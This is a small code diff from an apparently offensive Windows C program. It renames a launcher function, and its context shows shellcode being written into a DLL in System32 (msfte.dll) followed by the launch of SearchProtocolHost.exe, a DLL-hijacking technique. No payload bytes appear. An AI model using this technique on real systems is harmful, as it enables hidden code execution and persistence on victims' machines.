@@ -262,7 +262,7 @@ VOID WritePayloadDll(LPCTSTR szPath) {
 	CloseHandle(TargetDllFileHandle);
 }
 
-VOID LaunchWMIProcess() {
+VOID Process() {
     STARTUPINFOW StartupInformation;
     PROCESS_INFORMATION ProcessInformation;
 
@@ -313,6 +313,6 @@ int main() {
 		//将shellcode写入
 		WritePayloadDll(L"C:\\Windows\\System32\\msfte.dll");
 		//启动SearchProtocolHost.exe
-		LaunchWMIProcess();	
+		Process();	
 		return 0;
 }
